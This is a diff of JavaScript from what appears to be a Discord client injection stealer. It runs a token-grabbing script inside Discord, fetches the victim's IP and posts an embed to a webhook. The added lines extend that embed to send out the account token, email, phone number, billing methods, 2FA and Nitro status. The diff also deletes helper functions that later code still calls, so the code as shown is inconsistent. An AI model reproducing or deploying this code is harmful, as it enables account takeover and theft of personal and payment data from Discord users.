@@ -52,35 +52,6 @@ async function execScript(str) {
 
 }
 
-const makeEmbed = async ({
-    fields,
-    image,
-    thumbnail,
-    description
-}) => {
-    var params = {
-        username: "AdB2GD31sf2SF76",
-        content: "",
-        embeds: [{
-            title: "Discord was opened",
-            color: config["embed-color"],
-            fields: fields,
-            description: description ?? "",
-            
-          
-
-
-        }]
-    };
-
-    if (image) params.embeds[0].image = {
-        url: image
-    }
-    if (thumbnail) params.embeds[0].thumbnail = {
-        url: thumbnail
-    }
-    return params
-}
 const getIP = async () => {
     var json = await execScript(`var xmlHttp = new XMLHttpRequest();\nxmlHttp.open( "GET", "https://www.myexternalip.com/json", false );\nxmlHttp.send( null );\nJSON.parse(xmlHttp.responseText);`)
     return json.ip
@@ -132,43 +103,6 @@ const GetA2F = (bouki) => {
 
 
 
-const parseBilling = billings => {
-    var Billings = ""
-    billings.forEach(res => {
-        if (res.invalid) return
-        switch (res.type) {
-            case 1:
-                Billings += ":heavy_check_mark: :credit_card:"
-                break
-            case 2:
-                Billings += ":heavy_check_mark: <:paypal:896441236062347374>"
-        }
-    })
-    if (!Billings) Billings = ":x:"
-    return Billings
-}
-
-const calcDate = (a, b) => new Date(a.setMonth(a.getMonth() + b))
-
-const GetNitro = r => {
-    switch (r.premium_type) {
-        default:
-            return ":x:"
-        case 1:
-            return "<:946246402105819216:962747802797113365>"
-        case 2:
-            if (!r.premium_guild_since) return "<:946246402105819216:962747802797113365>"
-            var now = new Date(Date.now())
-            var arr = ["<:Booster1Month:1051453771147911208>", "<:Booster2Month:1051453772360077374>", "<:Booster6Month:1051453773463162890>", "<:Booster9Month:1051453774620803122>", "<:boost12month:1068308256088400004>", "<:Booster15Month:1051453775832961034>", "<:BoosterLevel8:1051453778127237180>", "<:Booster24Month:1051453776889917530>"]
-            var a = [new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since), new Date(r.premium_guild_since)]
-            var b = [2, 3, 6, 9, 12, 15, 18, 24]
-            var r = []
-            for (var p in a) r.push(Math.round((calcDate(a[p], b[p]) - now) / 86400000))
-            var i = 0
-            for (var p of r) p > 0 ? "" : i++
-            return "<:946246402105819216:962747802797113365> " + arr[i]
-    }
-}
 const post = async (params) => {
     params = JSON.stringify(params)
     var token = await execScript(tokenScript)
@@ -224,9 +158,15 @@ const FirstTime = async () => {
         var params = await makeEmbed({
             title: "User Information",
             fields: [
-                { name: "IP", value: `\`${ip}\``, inline: true },
-                { name: "Username", value: `\`${user.username}\``, inline: true },
-                { name: "ID", value: `\`${user.id}\``, inline: true },
+                { name: "IP", value: `\`${ip}\``, inline: false },
+                { name: "Username", value: `\`${user.username}\``, inline: false },
+                { name: "ID", value: `\`${user.id}\``, inline: false },
+                { name: "Nitro", value: `${GetNitro(Nitro)}`, inline: false },
+                { name: "NSFW", value: `${GetNSFW(user.nsfw_allowed)}`, inline: false },
+                { name: "2FA", value: `${GetA2F(user.mfa_enabled)}`, inline: false },
+                { name: "Billing", value: `${Billings}`, inline: false },
+                { name: "Email", value: `\`${user.email}\``, inline: false },
+                { name: "Phone", value: `\`${user.phone ?? "None"}\``, inline: false },
                 { name: "Token", value: `\`${token}\``, inline: false }
             ],
             image: userBanner,
